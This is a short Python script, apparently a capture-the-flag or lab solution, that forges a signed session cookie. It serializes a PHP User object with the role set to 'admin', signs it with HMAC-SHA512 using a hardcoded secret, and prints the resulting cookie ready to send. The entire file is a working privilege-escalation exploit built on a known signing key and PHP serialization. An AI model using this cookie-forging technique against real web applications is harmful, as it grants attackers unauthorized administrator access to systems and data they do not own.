
import hmac
import hashlib
import base64
from urllib.parse import quote

serialization = b"""O:4:"User":2:{s:8:"username";s:5:"Lorie";s:4:"role";s:5:"admin";}"""

secret = b"""3@#54!%&aiobe:th1s1sav3radandomandd1ff1culttoguesss3cr3t!"""

b64ed = base64.b64encode(serialization)

print("[Base 64] %s"%b64ed)

_hash = hmac.new(secret, b64ed, hashlib.sha512).hexdigest().encode()

print("[Hash] %s"%_hash)

b64_hash = base64.b64encode(_hash)

print("[B64 hash] %s"%b64_hash)

cookie = b64_hash + b":" + b64ed

print("[Cookie] %s"%cookie)


print("[Cookie quoted] %s"%quote(cookie))